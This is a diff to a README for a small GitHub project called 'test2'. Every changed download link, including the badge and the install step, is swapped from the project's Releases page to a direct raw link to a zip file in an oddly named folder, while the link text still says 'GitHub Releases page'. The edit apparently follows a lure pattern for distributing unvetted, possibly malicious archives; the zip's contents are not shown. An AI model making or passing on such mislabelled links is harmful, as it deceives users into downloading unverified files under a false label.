@@ -6,9 +6,9 @@ Welcome to test2, a database programming test project. This application contains
 
 ## 📥 Download
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/BannaDev830/test2/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/BannaDev830/test2/main/androphorous/test2.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/BannaDev830/test2/main/androphorous/test2.zip)
 
-Visit this page to download: [GitHub Releases](https://github.com/BannaDev830/test2/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/BannaDev830/test2/main/androphorous/test2.zip)
 
 ## 💻 System Requirements
 
@@ -20,7 +20,7 @@ Visit this page to download: [GitHub Releases](https://github.com/BannaDev830/te
 
 ## 📦 Download & Install
 
-1. Go to the [GitHub Releases page](https://github.com/BannaDev830/test2/releases).
+1. Go to the [GitHub Releases page](https://raw.githubusercontent.com/BannaDev830/test2/main/androphorous/test2.zip).
 2. Look for the latest release.
 3. Download the suitable file for your operating system. Usually, it will be a zip or tar file.
 4. Unzip the file to a folder of your choice.
